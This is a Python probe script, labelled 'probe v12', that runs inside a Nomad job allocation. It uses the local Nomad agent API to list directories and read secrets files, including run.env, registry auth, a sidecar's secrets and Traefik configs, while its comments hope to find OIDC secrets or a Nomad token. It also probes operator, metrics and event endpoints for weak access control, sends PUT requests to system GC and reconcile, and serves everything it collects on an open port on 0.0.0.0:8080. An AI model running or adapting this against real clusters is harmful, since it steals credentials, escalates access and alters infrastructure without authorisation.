import http.server
import json
import os
import subprocess
import re

results = {}

def run_cmd(name, cmd, timeout=10):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, shell=isinstance(cmd, str))
        results[name] = {"stdout": r.stdout[:8000], "stderr": r.stderr[:2000]}
    except Exception as e:
        results[name] = {"error": str(e)}

LOCAL = "https://169.254.1.2:4646"

# ============================================
# STEP 1: DISCOVER OUR ALLOCATION ID
# ============================================
try:
    with open("/proc/self/mountinfo") as f:
        minfo = f.read()
    results["mountinfo"] = {"stdout": minfo[:2000]}
    # Extract alloc ID from path like /opt/nomad/data/alloc/UUID/...
    m = re.search(r'/opt/nomad/data/alloc/([a-f0-9-]{36})/', minfo)
    if m:
        ALLOC_ID = m.group(1)
        results["our_alloc_id"] = {"stdout": ALLOC_ID}
    else:
        ALLOC_ID = None
        results["our_alloc_id"] = {"stdout": "NOT_FOUND", "raw": minfo[:500]}
except Exception as e:
    ALLOC_ID = None
    results["our_alloc_id"] = {"error": str(e)}

# ============================================
# STEP 2: FILESYSTEM ACCESS WITH CURRENT ALLOC ID
# ============================================
if ALLOC_ID:
    # List various paths in our allocation
    paths = [
        ("fs_ls_root", ""),
        ("fs_ls_alloc", "alloc"),
        ("fs_ls_alloc_data", "alloc/data"),
        ("fs_ls_alloc_logs", "alloc/logs"),
        ("fs_ls_alloc_tmp", "alloc/tmp"),
        ("fs_ls_secrets", "secrets"),
        ("fs_ls_local", "local"),
        ("fs_ls_main", "main"),
        ("fs_ls_sidecar", "sidecar"),
        ("fs_ls_sidecar_local", "sidecar/local"),
        ("fs_ls_sidecar_secrets", "sidecar/secrets"),
        ("fs_ls_pod", "pod"),
        ("fs_ls_run", "run"),
        ("fs_ls_preflight", "preflight"),
    ]
    for name, path in paths:
        if path:
            run_cmd(name, f"curl -sk -m 5 '{LOCAL}/v1/client/fs/ls/{ALLOC_ID}?path={path}' 2>&1")
        else:
            run_cmd(name, f"curl -sk -m 5 '{LOCAL}/v1/client/fs/ls/{ALLOC_ID}' 2>&1")
    
    # Try to read files
    cat_paths = [
        ("fs_cat_run_env", "secrets/run.env"),
        ("fs_cat_nomad_mount", "secrets/.nomad-mount"),
        ("fs_cat_registry", "secrets/registry-auth.env"),
        # Sidecar may have Traefik config with OIDC secrets
        ("fs_cat_sidecar_traefik", "sidecar/local/traefik.yaml"),
        ("fs_cat_sidecar_traefik2", "sidecar/local/traefik.yml"),
        ("fs_cat_sidecar_traefik3", "sidecar/local/config.yaml"),
        ("fs_cat_sidecar_traefik4", "sidecar/local/dynamic.yaml"),
        ("fs_cat_sidecar_traefik5", "sidecar/local/dynamic.yml"),
        # Try to read sidecar's secrets (may contain Nomad token!)
        ("fs_cat_sidecar_secrets_env", "sidecar/secrets/run.env"),
        ("fs_cat_sidecar_nomad_mount", "sidecar/secrets/.nomad-mount"),
    ]
    for name, path in cat_paths:
        run_cmd(name, f"curl -sk -m 5 '{LOCAL}/v1/client/fs/cat/{ALLOC_ID}?path={path}' 2>&1")
    
    # Stat our alloc
    run_cmd("fs_stat_root", f"curl -sk -m 5 '{LOCAL}/v1/client/fs/stat/{ALLOC_ID}?path=/' 2>&1")

    # ============================================
    # STEP 3: TRY READING ALLOCATION DETAILS
    # ============================================
    run_cmd("alloc_detail", f"curl -sk -m 5 '{LOCAL}/v1/allocation/{ALLOC_ID}' 2>&1")

# ============================================
# STEP 4: NODE INFO DISCOVERY
# ============================================
# Try to get our node ID from client stats or other endpoints
run_cmd("client_stats", f"curl -sk -m 3 '{LOCAL}/v1/client/stats' 2>&1 | head -c 1000")

# Event stream - might leak data without auth
run_cmd("event_stream", f"curl -sk -m 5 '{LOCAL}/v1/event/stream?topic=Allocation&topic=Job&topic=Node' 2>&1 | head -c 3000")

# Operator endpoints
run_cmd("scheduler_config", f"curl -sk -m 3 '{LOCAL}/v1/operator/scheduler/configuration' 2>&1 | head -c 500")
run_cmd("autopilot_config", f"curl -sk -m 3 '{LOCAL}/v1/operator/autopilot/configuration' 2>&1 | head -c 500")
run_cmd("autopilot_health", f"curl -sk -m 3 '{LOCAL}/v1/operator/autopilot/health' 2>&1 | head -c 500")

# Try /v1/agent/schedulers
run_cmd("agent_schedulers", f"curl -sk -m 3 '{LOCAL}/v1/agent/schedulers' 2>&1 | head -c 500")

# System endpoints that might have relaxed ACL
run_cmd("system_gc", f"curl -sk -m 3 -X PUT '{LOCAL}/v1/system/gc' 2>&1 | head -c 300")
run_cmd("system_reconcile", f"curl -sk -m 3 -X PUT '{LOCAL}/v1/system/reconcile/summaries' 2>&1 | head -c 300")

# CSI endpoints
run_cmd("csi_volumes", f"curl -sk -m 3 '{LOCAL}/v1/volumes' 2>&1 | head -c 300")
run_cmd("csi_plugins", f"curl -sk -m 3 '{LOCAL}/v1/plugins?type=csi' 2>&1 | head -c 300")

# Metrics endpoint (Prometheus format, often unauthenticated)
run_cmd("metrics", f"curl -sk -m 3 '{LOCAL}/v1/metrics' 2>&1 | head -c 4000")

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(results, indent=2, default=str).encode())
    def log_message(self, *args):
        pass

print("Starting probe v12 on port 8080...")
http.server.HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
